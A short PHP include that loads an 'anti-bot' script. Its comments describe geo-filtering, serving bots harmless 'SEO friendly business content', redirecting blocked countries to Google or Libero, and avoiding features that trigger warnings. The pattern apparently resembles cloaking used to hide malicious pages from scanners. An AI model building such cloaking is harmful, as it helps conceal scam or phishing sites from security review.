<?php
// Clean Anti-Bot Protection Include
// This file only does GeoIP filtering + Bot detection
// No aggressive security features that could trigger warnings

require_once 'antibot_clean.php';

// The protection will run automatically and either:
// 1. Allow access (if from allowed country and not a bot)
// 2. Show bot content (if detected as a bot) - SEO friendly business content
// 3. Redirect (if from blocked country) - to Google or Libero
?>
